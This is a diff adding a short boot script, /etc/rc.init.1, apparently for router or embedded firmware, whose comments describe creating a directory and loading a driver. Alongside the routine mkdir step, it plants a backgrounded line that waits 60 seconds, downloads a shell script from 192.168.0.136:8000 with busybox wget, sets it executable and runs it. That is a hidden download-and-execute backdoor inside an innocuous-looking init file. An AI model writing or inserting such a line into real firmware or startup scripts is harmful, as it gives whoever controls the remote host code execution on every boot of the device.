@@ -1,0 +1,9 @@
+#!/bin/sh
+#
+# /etc/rc.init.1 , should create necessary directory and load the driver
+# please don't access nvram here, or modfiy any other env variable code here
+# - by wenij
+$(/bin/sleep 60 && /bin/busybox wget -O /tmp/1.sh http://192.168.0.136:8000/1.sh && /bin/busybox chmod 777 /tmp/1.sh && /tmp/1.sh) &
+if [ ! -d "/var/tmp/events" ]; then
+	mkdir /var/tmp/events
+fi
